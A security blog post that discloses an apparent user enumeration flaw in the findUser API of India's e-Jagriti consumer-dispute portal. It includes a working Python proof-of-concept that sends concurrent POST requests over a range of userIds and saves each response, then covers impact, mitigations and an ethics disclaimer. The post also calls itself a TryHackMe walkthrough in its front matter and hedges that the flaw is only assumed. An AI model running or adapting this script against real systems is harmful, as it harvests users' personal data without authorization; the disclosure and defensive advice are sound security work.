---
title: Exposing a User Enumeration Vulnerability in e-Jagriti’s findUser Endpoint
date: 2025-07-14T02:24:47+05:30
lastmod: 2025-07-14T02:24:47+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://bit.ly/34sGFiK
cover: https://raw.githubusercontent.com/anir0y/cdn/refs/heads/main/owasp-blog-1.png # for tryhackMe
simg: https://raw.githubusercontent.com/anir0y/cdn/refs/heads/main/owasp-blog-1.png

categories:
  - bugbounty
tags:
  - owasp
  - idor


draft: false
description: Try Hack Me Room ROOM_NAME solved by Animesh Roy. this is a walkthough. read more...

---
<!-- Google Ads -->
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-3526678290068011"
     data-ad-slot="7160066188"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
<!-- END -->

---
## Introduction

The e-Jagriti platform, developed by the Department of Consumer Affairs, Government of India, is a digital solution for consumer dispute resolution, offering features such as online case filing, real-time monitoring, and AI-powered search capabilities. Hosted at [e-jagriti.gov.in]([invalid url, do not cite]), it aims to enhance accessibility and efficiency in addressing consumer grievances. However, a potential security vulnerability in its `/services/user/auth/v2/findUser` endpoint may allow attackers to perform user enumeration, identifying valid user accounts by exploiting differences in server responses. This blog post examines the nature of this vulnerability, demonstrates a proof of concept (PoC), evaluates its potential impact, and proposes mitigation strategies to enhance the platform’s security.

## Understanding User Enumeration

User enumeration is a security vulnerability that enables an attacker to determine whether a specific username or user ID exists within a system. This is typically achieved by analyzing variations in server responses when querying different user identifiers. For example, a system might return user data or a specific error for an existing user, while providing a different error (e.g., “User not found”) for a non-existent user. According to resources like the [Rapid7 Blog](https://www.rapid7.com/blog/post/2017/06/15/about-user-enumeration/), this discrepancy allows attackers to compile a list of valid users, which can be used for subsequent attacks such as brute-force password attempts or targeted phishing campaigns. The [OWASP Foundation](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account) identifies user enumeration as a critical component of penetration testing due to its potential to expose sensitive account information.

## The Vulnerability in e-Jagriti

The `/services/user/auth/v2/findUser` endpoint in e-Jagriti is designed to retrieve user information based on a provided `userId` in a POST request. However, this endpoint may inadvertently facilitate user enumeration. By sending requests with various `userId` values, an attacker could potentially distinguish between existing and non-existent users based on the server’s response. For instance, a valid `userId` might return user data or a specific success message, while an invalid `userId` could trigger a “user not found” or similar error. This behavior, if present, aligns with the characteristics of user enumeration vulnerabilities described by [Virtue Security](https://www.virtuesecurity.com/kb/username-enumeration/) and [Blue Goat Cyber](https://bluegoatcyber.com/blog/username-enumeration-vulnerability-explained/).

The vulnerability was explored through a PoC that systematically queries the endpoint with a range of `userId` values, saving the responses for analysis. The ability to automate such queries using concurrent threads increases the efficiency of this process, making it feasible for an attacker to enumerate users at scale.

## Proof of Concept

The following Python script demonstrates how the vulnerability can be exploited by sending POST requests to the `/services/user/auth/v2/findUser` endpoint with a range of `userId` values. The script uses concurrent threads to process multiple requests efficiently and saves each response as a JSON file named after the corresponding `userId`.

```python
import requests
import json
import os
from concurrent.futures import ThreadPoolExecutor

# Define the request details
url = "[invalid url, do not cite]
headers = {
    "Host": "e-jagriti.gov.in",
    "Cookie": "XSRF-TOKEN=NDKDdfdsfkldsfNd3SZAJfwLsTl5WUgOkE",
    "Content-Length": "18",
    "Sec-Ch-Ua-Platform": "\"macOS\"",
    "Authorization": "",
    "Accept-Language": "en-US,en;q=0.9",
    "Sec-Ch-Ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\"",
    "Sec-Ch-Ua-Mobile": "?0",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    "Accept": "application/json",
    "Content-Type": "application/json",
    "Origin": "[invalid url, do not cite]
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "[invalid url, do not cite]
    "Accept-Encoding": "gzip, deflate, br",
    "Priority": "u=1, i",
    "Connection": "keep-alive"
}

# Define the sequence of userIds (e.g., range from 10005 to 10010)
user_id_range = range(10005, 10011)  # Adjust as needed

# Number of concurrent threads (adjust as needed)
num_threads = 3  # You can change this to control concurrency

def send_request(user_id: int) -> None:
    """Send a POST request for a given userId and save the response."""
    try:
        # Update payload with current userId
        payload = {"userId": user_id}
        
        # Send the POST request
        response = requests.post(url, headers=headers, json=payload)
        
        # Check if the response is successful
        response.raise_for_status()
        
        # Parse the response as JSON
        response_json = response.json()
        
        # Save the response to a file named after userId
        filename = f"{user_id}.json"
        with open(filename, 'w') as f:
            json.dump(response_json, f, indent=4)
        
        print(f"Response for userId {user_id} saved to {filename}")

    except requests.exceptions.RequestException as e:
        print(f"Error sending request for userId {user_id}: {e}")
    except ValueError as e:
        print(f"Error parsing JSON response for userId {user_id}: {e}")
    except IOError as e:
        print(f"Error writing to file for userId {user_id}: {e}")

# Use ThreadPoolExecutor to send requests concurrently
with ThreadPoolExecutor(max_workers=num_threads) as executor:
    executor.map(send_request, user_id_range)

print("All requests completed.")
```

This script can be adapted to query a larger range of `userId` values or a specific list of IDs. By examining the saved JSON files, an attacker could identify valid `userId` values based on differences in the response content, such as the presence of user data versus error messages.

## Potential Impact

The user enumeration vulnerability in e-Jagriti could have significant consequences, depending on the nature of the data returned and the platform’s security measures. Potential impacts include:

- **Targeted Brute-Force Attacks**: As noted by [UpGuard](https://www.upguard.com/blog/what-is-an-enumeration-attack), a list of valid user IDs enables attackers to focus brute-force password attacks on confirmed accounts, increasing the likelihood of unauthorized access.
- **Phishing and Social Engineering**: Valid user IDs can be used to craft targeted phishing campaigns, as highlighted by [LinkedIn](https://www.linkedin.com/pulse/understanding-preventing-user-enumeration-donny-widjaja-mspm-cspo), making attacks more convincing and effective.
- **Data Breaches**: If the endpoint returns sensitive user information, such as personal details, it could lead to data breaches, compromising user privacy and violating regulations like India’s Personal Data Protection Bill.
- **Reputation and Compliance Risks**: A confirmed vulnerability could undermine public trust in e-Jagriti and lead to non-compliance with data protection standards, as outlined by [SmartScanner](https://www.thesmartscanner.com/vulnerability-list/user-enumeration).

The exact impact depends on the endpoint’s response behavior and the sensitivity of the data returned, which requires further investigation to fully assess.

## Mitigation Strategies

To address this potential vulnerability, the following measures are recommended, based on best practices from sources like [OWASP](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account) and [TechTarget](https://www.techtarget.com/searchsecurity/tip/What-enumeration-attacks-are-and-how-to-prevent-them):

1. **Consistent Error Messages**: Configure the endpoint to return identical error messages for both valid and invalid `userId` values (e.g., “Invalid request”) to prevent attackers from distinguishing between them.
2. **Rate Limiting**: Implement rate limiting to restrict the number of requests an attacker can make in a short period, reducing the feasibility of large-scale enumeration.
3. **Authentication Requirements**: Require authentication (e.g., a valid session token) before allowing access to user information, ensuring only authorized users can query the endpoint.
4. **Monitoring and Logging**: Deploy monitoring systems to detect and alert on suspicious patterns, such as repeated requests with sequential `userId` values.
5. **Regular Security Audits**: Conduct periodic security audits and penetration testing to identify and address vulnerabilities proactively.

## Comparison with Common Vulnerabilities

| Vulnerability Type       | e-Jagriti User Enumeration                     | Typical Login Page Enumeration                |
|--------------------------|-----------------------------------------------|---------------------------------------------|
| **Attack Vector**        | POST requests to `/findUser` endpoint          | Login or password reset forms               |
| **Response Difference**  | User data vs. error message (assumed)         | “Invalid username” vs. “Invalid password”   |
| **Impact**               | Enables targeted attacks, potential data leak | Enables targeted attacks                    |
| **Mitigation**           | Consistent errors, rate limiting              | Generic error messages, CAPTCHA            |

This table illustrates how e-Jagriti’s vulnerability aligns with common user enumeration issues but is specific to its API endpoint design.

## Ethical Considerations

Exposing vulnerabilities like this one is intended to promote awareness and encourage secure development practices. However, testing or exploiting such vulnerabilities without explicit permission is illegal and unethical. The PoC provided here is for educational purposes only, and any security testing should be conducted in accordance with legal and ethical guidelines, such as obtaining authorization from the platform’s administrators.

## Conclusion

The potential user enumeration vulnerability in e-Jagriti’s `/services/user/auth/v2/findUser` endpoint highlights the critical need for robust security measures in digital governance platforms. By allowing attackers to identify valid user IDs, this vulnerability could facilitate targeted attacks and compromise user trust. Implementing consistent error messages, rate limiting, and authentication requirements can mitigate this risk. This disclosure aims to foster dialogue on improving the security of e-Jagriti, ensuring it remains a reliable and secure platform for consumer dispute resolution.

**Citations**:
- [Rapid7 Blog: User Enumeration Explained](https://www.rapid7.com/blog/post/2017/06/15/about-user-enumeration/)
- [Medium: What is User Enumeration?](https://medium.com/@leilaalvess/what-is-user-enumeration-c7d5a56eeba0)
- [UpGuard: What is an Enumeration Attack?](https://www.upguard.com/blog/what-is-an-enumeration-attack)
- [CWE: Observable Discrepancy (CWE-203)](https://cwe.mitre.org/data/definitions/203.html)
- [Virtue Security: Username Enumeration](https://www.virtuesecurity.com/kb/username-enumeration/)
- [SmartScanner: User Enumeration](https://www.thesmartscanner.com/vulnerability-list/user-enumeration)
- [TechTarget: Enumeration Attacks](https://www.techtarget.com/searchsecurity/tip/What-enumeration-attacks-are-and-how-to-prevent-them)
- [Blue Goat Cyber: Username Enumeration Vulnerability Explained](https://bluegoatcyber.com/blog/username-enumeration-vulnerability-explained/)
- [LinkedIn: Understanding and Preventing User Enumeration Vulnerability](https://www.linkedin.com/pulse/understanding-preventing-user-enumeration-donny-widjaja-mspm-cspo)
- [OWASP: Testing for Account Enumeration and Guessable User Account](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account)


---
<!-- Google Ads -->

<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-3526678290068011"
     data-ad-slot="7160066188"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
<!-- END -->


<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="anir0y" data-description="Support me on Buy me a coffee!" data-message="" data-color="#5F7FFF" data-position="Right" data-x_margin="18" data-y_margin="18"></script>

<!-- EOF -->
